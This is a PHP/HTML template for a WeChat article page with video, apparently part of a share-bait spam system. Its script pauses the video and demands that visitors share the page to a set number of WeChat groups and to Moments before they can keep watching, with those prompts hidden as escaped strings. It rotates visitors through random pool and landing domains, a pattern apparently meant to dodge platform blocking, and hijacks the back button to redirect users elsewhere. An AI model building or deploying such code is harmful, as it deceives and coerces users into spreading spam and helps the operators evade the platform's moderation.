<?php defined('IN_QIFANPHP') or exit('No permission resources.'); ?><html>
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
  	<title><?php echo $title;?></title>
	<link href="<?php echo STATIC_URL;?>css/show_gzh.css" rel="stylesheet">
	<link href="//cdn.bootcss.com/weui/0.4.3/style/weui.min.css" rel="stylesheet">
	<script src="http://res.wx.qq.com/open/js/jweixin-1.4.0.js"></script>
	<script src="<?php echo STATIC_URL;?>js/jquery-1.8.2.min.js"></script>
	<script src="<?php echo STATIC_URL;?>js/qifan.js"></script>
	<script src="http://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_jq.js" type="text/javascript" ></script>
	<title><?php echo $title;?></title>
</head>
<body id="activity-detail" class="zh_CN mm_appmsg appmsg_skin_default appmsg_style_default rich_media_empty_extra">
<link rel="dns-prefetch" href="//res.wx.qq.com">
<link rel="dns-prefetch" href="//mmbiz.qpic.cn">
<link rel="shortcut icon" type="image/x-icon" href="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/common/faviconsharenumsharenumc41b.ico">
<div id="js_article" class="rich_media">
    <div id="js_top_ad_area" class="top_banner"></div>
    <div class="rich_media_inner">
        <div id="page-content" class="rich_media_area_primary">
			<div class="rich_media_area_primary_inner">
				<div id="img-content">
					<hsharenum class="rich_media_title" id="activity-name"> 
						<?php echo $title;?>
					</hsharenum>
					<div id="meta_content" class="rich_media_meta_list">
						<span class="rich_media_meta rich_media_meta_text"><?php echo $nickname;?></span>
						<span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
							<a href="<?php echo $gzhurl;?>" id="js_name"><?php echo $gzhname;?></a>
						</span>
						<em id="publish_time" class="rich_media_meta rich_media_meta_text"><?php echo date("n",$inputtime);?>月<?php echo date("j",$inputtime);?>日</em>
					</div>
					<?php if($videofile) { ?><div class="page-con" id="mod_play"><video src="<?php echo $videofile;?>" x5-video-player-type='h5'></video></div><?php } ?>
					<?php if($vid) { ?><div id="mod_play"></div><?php } ?>
					<div class="page-con"><?php echo $content;?></div>
				</div>
			</div>
			<div class="page-bottom">
				<span class="page-all"><a href="javascript:;" id="quanwen">阅读全文</a></span>&nbsp;&nbsp;&nbsp;&nbsp;
				<span class="page-du">阅读&nbsp;<span class="page-click"><?php echo $click;?><span>&nbsp;</span>
				<span class="page-zan">
					<img class="down" src="<?php echo STATIC_URL;?>images/thum_down.png" style="height:16px">
					<img class="up" src="<?php echo STATIC_URL;?>images/thum_up.png" style="height:16px;display:none;">
					<span id="dianzan"><?php echo $dianzan;?></span>
				</span>
			</div>
			<div class="page-ad">
				<span class="page-ad-t">
					<span class="page-l">--------------------------------------------------------------------------------</span>
					<span class="page-c">广告∨</span>
					<span class="page-r">--------------------------------------------------------------------------------</span>
				</span>
				<span class="page-d"><a href="http://code.yianju.ltd/qifanart/pubilc/tousu/">投诉</a></span>
				<span class="page-ad-d"><a href="<?php echo $adurl;?>"><img src="<?php echo $adimg;?>" /></a></span>
			</div>
		</div>
	</div>
</div>
<div id="zhezhao_share" class="share-a">
    <img src="<?php echo STATIC_URL;?>images/fxq.png" id="share-wx-img" style="width: 100%; padding-right: 15px;">
</div>
<div class="weui_dialog_alert" id="dialog_alert" style="display:none;color:#000000">
	<div class="weui_mask"></div>
	   <div class="weui_dialog">
		   <div class="weui_dialog_hd"><strong class="weui_dialog_title">温馨提示</strong></div>
		   <div class="weui_dialog_bd" id="dialog_alert_Mes" style="color:#000000"></div>
		   <div class="weui_dialog_ft">
			   <a onclick="dialog_alert_Hide();" id="okBtn" class="weui_btn_dialog primary">好</a>
		   </div>
	   </div>
	</div>
</div>
<?php if($vid) { ?>
<script>
	//腾讯视频
	var vid = "<?php echo $vid;?>";
	var width = $(".play_b").width();
	var sharetime = <?php echo $sharetime;?>;
	var video = new tvp.VideoInfo();
	video.setVid(vid);
	var player =new tvp.Player();
	var start = true;
	setInterval(function(){
		var currentTime = player.getPlaytime();
		if(currentTime >= sharetime && $("#zhezhao_share").is(":hidden") && window.location.href.indexOf('ok') < 0) {
			player.pause();
			if(!in_array(xdomain,ddomain)){//现域名!=落地域名时
				window.location.href=window.location.href.replace(xdomain,ndomain);
			};
		};
	},1000);
	player.create({
		width:width,
		height:240,
		video:video,
		modId:"mod_play",
		autoplay:true
	});
</script>
<?php } ?>
<?php if($videofile) { ?>
<script>
	//视频文件或地址
	if(/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
		$('.page-con video').attr({'id':'video','preload':'auto','webkit-playsinline':'true','x5-video-player-fullscreen':'true','x-webkit-airplay':'allow','x5-video-player-type':'h5','x5-video-orientation':'portraint','playsinline':'true','controls':'controls'});
	}else if(/(Android)/i.test(navigator.userAgent)) {
		$('.page-con video').attr({'id':'video','preload':'auto','webkit-playsinline':'true','controls':'controls'});
	}else{
	};
	var player = document.getElementById("video");
	var shareTime = <?php echo $sharetime;?>;
	player.ontimeupdate = function(){
		if(player.currentTime >= shareTime && $("#zhezhao_share").is(":hidden") && window.location.href.indexOf('ok') < 0){
			player.pause();
			if(!in_array(xdomain,ddomain)){//现域名!=落地域名时
				window.location.href=window.location.href.replace(xdomain,ndomain);
			};
		};
	};
</script>
<?php } ?>
<script>
	wx.config({
		debug: false, 
		appId:'<?php echo $appid;?>', 
		timestamp:<?php echo $timestamp;?>,
		nonceStr:'<?php echo $noncestr;?>',
		signature:'<?php echo $signature;?>',
		jsApiList:['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideAllNonBaseMenuItem', 'showMenuItems']
	});
	wx.ready(function(){
			wx.hideAllNonBaseMenuItem();
		});
	function in_array(domain, domainarr) {//检测数组
		for (s = 0; s < domainarr.length; s++) {
			thisEntry = domainarr[s].toString();
			if (thisEntry == domain) {
			return true;
			}
		}
		return false;
	};
	var quanwenurl = '<?php echo $quanwenurl;?>';
	var safelink = '<?php echo $path;?>';//入口目录
	var domains = '<?php echo $domains;?>';//域名池
	var ddomains = '<?php echo $ddomain;?>';//落地域名
	var okurl = '<?php echo $okurl;?>';//成功
	var backurl = '<?php echo $backurl;?>';//返回
	var imgurl = '<?php echo $thumb;?>';
	var xdomain = window.location.protocol+"//"+window.location.host;//现访问域名含http://协议
	var domain = safelink.split('/')[0]+'//'+safelink.split('/')[2];//入口域名
	var cdomain = domains.split(',');//域名池数组
	var mdomain = cdomain[parseInt(Math.random()*cdomain.length)];//随机域名池
	var ddomain = ddomains.split(',');//落地数组
	var ndomain = ddomain[parseInt(Math.random()*ddomain.length)];//随机落地
	if(xdomain == domain){//入口时到域名池
		window.location.href=window.location.href.replace(xdomain,mdomain);
	}else if(in_array(xdomain,cdomain)){
		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {WeixinJSBridge.call('hideOptionMenu');});
	}else if(in_array(xdomain,ddomain)){
		if(window.location.href.indexOf('ok') < 0){
          	$("#mod_play").hide();
			show_tip();
		};
	};
	if(okurl ==''){
		okurl = document.referrer.split('?')[0] + '?ok';
	};
	if(imgurl.indexOf('http') < 0){
		imgurl = domain +'<?php echo $thumb;?>';
	};
	/* 返回 */
	$(function(){
		pushHistory();
		var bool = false;
		setTimeout(function(){
				bool = true;
		},500);
		window.addEventListener("popstate", function(e) {
			if(bool){
					location.href=backurl;
				}
		}, false);
	});
	function pushHistory() {
		var state = {
			title: "",
			url: "#"
		};  
		window.history.pushState(state, state.title, state.url);  
	}
	$("#quanwen").click(function(){
		if(quanwenurl == ''){
			window.location.href = window.location.href.replace(xdomain,ndomain);
		}else{
			window.location.href = quanwenurl;
		}
	});
	$(".page-c").click(function(){
		$(".page-d").toggle();
	});
	$(".page-zan").click(function(){
		var zan = parseInt($("#dianzan").html());
		if($(".up").is(":hidden")){
			$(".up").show();
			$(".down").hide();
			$("#dianzan").html(zan+1);
		}else{
			$(".up").hide();
			$(".down").show();
			$("#dianzan").html(zan-1);
		}
	});
	/* 点赞 */
	$("#dianzan").click(function(){
		var zan = parseInt($("#dianzan").html());
		if($(".up").is(":hidden")){
			$(".up").show();
			$(".down").hide();
			$("#dianzan").html(zan+1);
		}else{
			$(".up").hide();
			$(".down").show();
			$("#dianzan").html(zan-1);
		}
	});
	function dialog_alert_Hide(){
		$("#dialog_alert").hide();
	}
	function dialog_alert_Mes(mes){
		$("#dialog_alert").show();
		$("#dialog_alert_Mes").html(mes);
	}
	function show_tip(){
		SDV();
		dialog_alert_Mes(unescape('%u628A%u597D%u4E1C%u897F%u5206%u4EAB%u7ED9%u60A8%u7684%u670B%u53CB%u5427%uFF01%u53D1%u9001%u5230%u5FAE%u4FE1%u7FA4%u5373%u53EF%u7EE7%u7EED%u89C2%u770B%uFF01'));
	}
	function SDV(){
		$("#zhezhao_share").show();
		$("#mod_play").html(" ");
		var num = 0;
		var sharenum = <?php echo $sharenum;?>;
		wx.ready(function(){
				wx.hideAllNonBaseMenuItem();
				wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
				wx.onMenuShareAppMessage({
					title: '<?php echo $sharetitle;?>',
					link: window.location.href.replace(xdomain,domain).split('?')[0],
					imgUrl:imgurl,
					desc: '<?php echo $sharedesc;?>',
					success: function(res) {
						setTimeout(function(){
							var	str = res.errMsg;
							if(str.indexOf("ok")>-1){
								num++;
								if(num >= sharenum){
									wx.hideAllNonBaseMenuItem();
									wx.showMenuItems({menuList: ['menuItem:share:timeline']});
									dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u5269%u4E0B%u6700%u540E%u4E00%u6B65%u5566%uFF01%u8BF7%u5206%u4EAB%u5230%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E%u670B%u53CB%u5708%3C/span%3E%u5373%u53EF%u89C2%u770B%uFF01'));
								}else{
									wx.hideAllNonBaseMenuItem();
									wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
									dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u8FD8%u9700%u5206%u4EAB%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E') + (sharenum - num) + unescape('%3C/span%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%u5373%u53EF%u89C2%u770B%uFF08%u5206%u4EAB%u76F8%u540C%u7FA4%u65E0%u6548%uFF09'));
								}
							}else{
								wx.hideAllNonBaseMenuItem();
								wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
								dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u8FD8%u9700%u5206%u4EAB%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E') + (sharenum - num) + unescape('%3C/span%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%u5373%u53EF%u89C2%u770B%uFF08%u5206%u4EAB%u76F8%u540C%u7FA4%u65E0%u6548%uFF09'));
							}
						}, 500);
					}
				});
				wx.onMenuShareTimeline({
					title: '<?php echo $quntitle;?>',
					link: window.location.href.replace(xdomain,domain).split('?')[0],
					imgUrl:imgurl,
					desc: '<?php echo $sharedesc;?>',
					success: function(res) {
						setTimeout(function(){
							window.location.href = okurl;
						}, 500);
					}
				});
			});
	}
</script>
<?php echo $site['site_code'];?>
</body>
</html>